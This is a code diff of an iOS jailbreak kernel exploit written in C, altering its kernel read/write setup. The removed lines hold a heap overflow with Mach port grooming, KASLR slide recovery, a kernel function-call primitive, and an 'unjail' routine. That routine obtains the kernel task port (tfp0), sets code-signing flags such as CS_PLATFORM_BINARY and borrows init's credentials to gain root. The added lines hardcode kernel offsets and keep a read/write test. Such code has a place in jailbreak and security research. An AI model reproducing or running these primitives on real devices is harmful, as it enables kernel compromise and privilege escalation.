@@ -15,7 +15,6 @@
 
 #include <CoreFoundation/CoreFoundation.h>
 
-#include "extra_offsets.h"
 
 // IOKit stuff
 
@@ -443,11 +442,11 @@ uint128_t rk128(uint64_t address) {
   r_obj[1] = 0x20003;                 // refcount
   r_obj[2] = kernel_buffer_base+0x48; // obj + 0x10 -> rdi (memmove dst)
   r_obj[3] = address;                 // obj + 0x18 -> rsi (memmove src)
-  r_obj[4] = kernel_uuid_copy;        // obj + 0x20 -> fptr
+  r_obj[4] = 0xFFFFFFF00746651C - 0xFFFFFFF00605C000; // TODO REPLACE WITH OFFSETS       // obj + 0x20 -> fptr
   r_obj[5] = ret;                     // vtable + 0x20 (::retain)
-  r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
+  r_obj[6] = 0xfffffff00744df80 - 0xFFFFFFF00605C000;  // vtable + 0x28 (::release)
   r_obj[7] = 0x0;                     //
-  r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
+  r_obj[8] = 0xFFFFFFF007444700 - 0xFFFFFFF00605C000;           // vtable + 0x38 (::getMetaClass)
   r_obj[9] = 0;                       // r/w buffer
   r_obj[10] = 0;
   
@@ -514,105 +513,10 @@ void wk64(uint64_t address, uint64_t value){
   wk128(address, new);
 }
 
-uint64_t prepare_kernel_rw() {
-  int prealloc_size = 0x900; // kalloc.4096
-  
-  mach_port_t *ports = malloc(nports * sizeof(mach_port_t));
-  sleep(1);
-  for (int i = 0; i < nports; i++){
-    ports[i] = prealloc_port(prealloc_size);
-  }
-  
-  // these will be contiguous now, convienient!
-  
-  mach_port_t holder = prealloc_port(prealloc_size);
-  mach_port_t first_port = prealloc_port(prealloc_size);
-  mach_port_t second_port = prealloc_port(prealloc_size);
-  
-  // free the holder:
-  mach_port_destroy(mach_task_self(), holder);
-  
-  // reallocate the holder and overflow out of it
-  uint64_t overflow_bytes[] = {0x1104,0,0,0,0,0,0,0};
-  do_overflow(0x1000, 64, overflow_bytes);
-  
-  // grab the holder again
-  holder = prealloc_port(prealloc_size);
-  
-  prepare_prealloc_port(first_port);
-  prepare_prealloc_port(second_port);
-  
-  // send a message to the first port; overwriting the header of the second prealloced message
-  // with a legitmate header:
-  
-  uint64_t valid_header[] = {0xc40, 0, 0, 0, 0, 0, 0, 0};
-  send_prealloc_msg(first_port, valid_header, 8);
-  
-  // send a message to the second port; writing a pointer to itself in the prealloc buffer
-  send_prealloc_msg(second_port, valid_header, 8);
-  
-  // receive on the first port, reading the header of the second:
-  uint64_t* buf = receive_prealloc_msg(first_port);
-  
-  for (int i = 0; i < 8; i++) {
-    printf("0x%llx\n", buf[i]);
-  }
-  
-  kernel_buffer_base = buf[1];
-  if (!kernel_buffer_base) {
-    return 0;
-  }
-  
-  // receive the message on second
-  receive_prealloc_msg(second_port);
-  
-  // send another message on first, writing a valid, safe header back over second
-  send_prealloc_msg(first_port, valid_header, 8);
-  
-  // free second and get it reallocated as a userclient:
-  mach_port_deallocate(mach_task_self(), second_port);
-  mach_port_destroy(mach_task_self(), second_port);
-  
-  mach_port_t uc = alloc_userclient();
-  
-  // read back the start of the userclient buffer:
-  buf = receive_prealloc_msg(first_port);
-  printf("user client? :\n");
-  for (int i = 0; i < 8; i++) {
-    printf("0x%llx\n", buf[i]);
-  }
-  
-  // save a copy of the original object:
-  memcpy(legit_object, buf, sizeof(legit_object));
-  
-  // this is the vtable for AGXCommandQueue
-  uint64_t vtable = buf[0];
-  
-  // rebase the symbols
-  kaslr_shift = vtable - AGXCommandQueue_vtable;
-  
-  kernel_base = 0xFFFFFFF007004000 + kaslr_shift;
-  get_metaclass = OSData_getMetaClass + kaslr_shift;
-  osserializer_serialize = OSSerializer_serialize + kaslr_shift;
-  ret = OSData_getMetaClass + 8 + kaslr_shift;
-  kernel_uuid_copy = k_uuid_copy + kaslr_shift;
-  
-  // save the port and userclient so we can use them for the r/w
-  oob_port = first_port;
-  target_uc = uc;
-  
-  for (int i = 0; i < nports; i++){
-    mach_port_destroy(mach_task_self(), ports[i]);
-  }
-  printf("all done!\n");
-  
-  return kernel_base;
-}
-
 int jb_go() {
-  int rv = init_extra_offsets();
-  if (rv) return rv;
-  uint64_t kernel_base = prepare_kernel_rw();
+//  int rv = init_extra_offsets();
+//  if (rv) return rv;
+//  uint64_t kernel_base = prepare_kernel_rw();
 #if 0
   uint64_t val = rk64(kernel_base);
   printf("read from kernel memory: 0x%016llx\n", val);
@@ -626,19 +530,20 @@ int jb_go() {
   
   return 42;
 #else
-  extern int unjail(void);
-  return kernel_base ? unjail() : -1;
+//  extern int unjail(void);
+//  return kernel_base ? unjail() : -1;
+    return 0;
 #endif
 }
 
 /*****************************************************************************/
 
-mach_port_t tfp0 = 0;
+mach_port_t tfp0 = MACH_PORT_NULL;
 
-static uint64_t our_proc = 0;
-static uint64_t init_proc = 0;
-static uint64_t kern_proc = 0;
-static uint64_t kern_task = 0;
+//static uint64_t our_proc = 0;
+//static uint64_t init_proc = 0;
+//static uint64_t kern_proc = 0;
+//static uint64_t kern_task = 0;
 
 kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
@@ -646,6 +551,11 @@ kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_
 size_t
 kread(uint64_t where, void *p, size_t size)
 {
+    
+    if(tfp0 == MACH_PORT_NULL) {
+        printf("[ERROR]: tfp0's port is null!\n");
+    }
+
     int rv;
     size_t offset = 0;
     while (offset < size) {
@@ -654,8 +564,9 @@ kread(uint64_t where, void *p, size_t size)
             chunk = size - offset;
         }
         rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
+
         if (rv || sz == 0) {
-            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
+            printf("[ERROR]: error reading buffer at @%p\n", (void *)(offset + where));
             break;
         }
         offset += sz;
@@ -682,6 +593,11 @@ kread_uint32(uint64_t where)
 size_t
 kwrite(uint64_t where, const void *p, size_t size)
 {
+    
+    if(tfp0 == MACH_PORT_NULL) {
+        printf("[ERROR]: tfp0's port is null!\n");
+    }
+    
     int rv;
     size_t offset = 0;
     while (offset < size) {
@@ -689,9 +605,9 @@ kwrite(uint64_t where, const void *p, size_t size)
         if (chunk > size - offset) {
             chunk = size - offset;
         }
-        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, chunk);
+        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
         if (rv) {
-            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
+            printf("[ERROR]: error copying buffer into region: @%p\n", (void *)(offset + where));
             break;
         }
         offset += chunk;
@@ -726,123 +642,26 @@ void kx2(uint64_t fptr, uint64_t arg1, uint64_t arg2) {
   kwrite(kernel_buffer_base, r_obj, sizeof(r_obj));
 
   io_service_t service = MACH_PORT_NULL;
-  kern_return_t err = IOConnectGetService(target_uc, &service);
+  IOConnectGetService(target_uc, &service);
 
   kwrite(kernel_buffer_base, legit_object, sizeof(r_obj));
 }
 
-uint32_t
-kx5(uint64_t fptr, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t arg5)
-{
-/*
-__text:FFFFFFF006337E10
-    STP     X22, X21, [SP,#-0x30]!
-    STP     X20, X19, [SP,#0x10]
-    STP     X29, X30, [SP,#0x20]
-    ADD     X29, SP, #0x20
-    MOV     X19, X1
-    MOV     X20, X0
-    LDR     X21, [X20,#0xB0]
-    LDR     X8, [X19]
-    STR     X8, [X20,#0xB0]
-    LDP     X0, X8, [X19,#8]
-    LDP     X1, X2, [X19,#0x18]
-    LDP     X3, X4, [X19,#0x28]
-    BLR     X8
-    STR     W0, [X19,#0x38]
-    STR     X21, [X20,#0xB0]
-    MOV     W0, #0
-    LDP     X29, X30, [SP,#0x20]
-    LDP     X20, X19, [SP,#0x10]
-    LDP     X22, X21, [SP],#0x30
-    RET
-*/
-  uint64_t where = kernel_buffer_base + 0xF00;
-  uint64_t args[8];
-  args[0] = 0;
-  args[1] = arg1;
-  args[2] = fptr;
-  args[3] = arg2;
-  args[4] = arg3;
-  args[5] = arg4;
-  args[6] = arg5;
-  args[7] = 0;
-  kwrite(where, args, sizeof(args));
-  kx2(call5 + kaslr_shift, where - 0xB0, where);
-  return kread_uint32(where + 0x38);
-}
 
 // Not really used
 int
-unjail(void)
+unjail(uint64_t main_kbase, uint64_t kbase_buffer)
 {
-    uint32_t our_pid = getpid();
-    uint64_t our_task = 0;
-    uint64_t proc = rk64(allproc + kaslr_shift);
-    while (proc) {
-        uint32_t pid = (uint32_t)rk64(proc + offsetof_p_pid);
-        if (pid == our_pid) {
-            our_proc = proc;
-        } else if (pid == 1) {
-            init_proc = proc;
-        } else if (pid == 0) {
-            kern_proc = proc;
-        }
-        proc = rk64(proc);
-    }
-    our_task = rk64(our_proc + offsetof_task);
-    kern_task = rk64(kern_proc + offsetof_task); /* rk64((_kernel_task = 0xfffffff0075f6050) + kaslr_shift) */
-
-    // our_task->itk_bootstrap = kernel_task->itk_sself
-    uint64_t itk_sself = rk64(kern_task + offsetof_itk_sself);
-    uint64_t tmp = rk64(our_task + offsetof_itk_bootstrap);
-    wk64(our_task + offsetof_itk_bootstrap, itk_sself);
-    int rv = task_get_special_port(mach_task_self(), 4, &tfp0);
-    wk64(our_task + offsetof_itk_bootstrap, tmp);
-    if (rv != KERN_SUCCESS || tfp0 == 0) {
-        printf("tfp0 FAILED: rv = %s, tfp = 0x%x\n", mach_error_string(rv), tfp0);
-        return -1;
-    }
-    printf("tfp0 = 0x%x\n", tfp0);
-
-    // first_port and second_port *should be* contiguous (if they aren't, we'll DIAF)
-    // since second_port is at kernel_buffer_base, then first_port is at kernel_buffer_base - 4096
-    // we have to fix first_port size, otherwise the kernel will panic upon exit (free to wrong zone)
-    kwrite_uint64(kernel_buffer_base - 4096, 0xc40);
-
-    // rk64/wk64 are disabled, use tfp0
-
-    const int slot = 4;
-    // host_priv_self()->special[4] = convert_task_to_port(proc_find(0)->task)
-    // that is: realhost.special[4] = ipc_port_make_send(kernel_task->itk_self)
-    uint64_t itk_self = kread_uint64(kern_task + offsetof_itk_self);
-    // XXX lock, reference++
-    uint32_t ip_mscount = kread_uint32(itk_self + offsetof_ip_mscount);
-    uint32_t ip_srights = kread_uint32(itk_self + offsetof_ip_srights);
-    ip_mscount++;
-    ip_srights++;
-    kwrite_uint32(itk_self + offsetof_ip_mscount, ip_mscount);
-    kwrite_uint32(itk_self + offsetof_ip_srights, ip_srights);
-    kwrite_uint64(realhost + offsetof_special + slot * sizeof(long) + kaslr_shift, itk_self);
-    /// host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
-
-    // grant ourselves some power
-    uint32_t csflags = kread_uint32(our_proc + offsetof_p_csflags);
-    kwrite_uint32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD));
-    uint64_t our_cred = kread_uint64(our_proc + offsetof_p_ucred);
-    uint64_t init_cred = kread_uint64(init_proc + offsetof_p_ucred);
     
-    // kppless (TODO: use after it actually works)
-//    uint64_t kern_cred = kread_uint64(kern_proc + offsetof_p_ucred);
-    
-    kwrite_uint64(our_proc + offsetof_p_ucred, init_cred);
+    kernel_buffer_base = kbase_buffer;
+    uint64_t val = rk64(main_kbase);
+    printf("[INFO]: read from kernel memory: 0x%016llx\n", val);
+    uint64_t test_val = 0x41424344abcdef;
+    wk64(kernel_buffer_base+0xfe0, test_val);
+    uint64_t read_back = rk64(kernel_buffer_base+0xfe0);
 
-    extern int go_extra_recipe(void);
-    rv = go_extra_recipe();
-
-//    extern kern_return_t go_kppless(uint64_t, uint64_t);
-//    rv = go_kppless(allproc + kaslr_shift, kern_cred);
+    printf("wrote: 0x%016llx\n", test_val);
+    printf("read back: 0x%016llx\n", read_back);
     
-    kwrite_uint64(our_proc + offsetof_p_ucred, our_cred);
-    return rv;
+    return 0;
 }
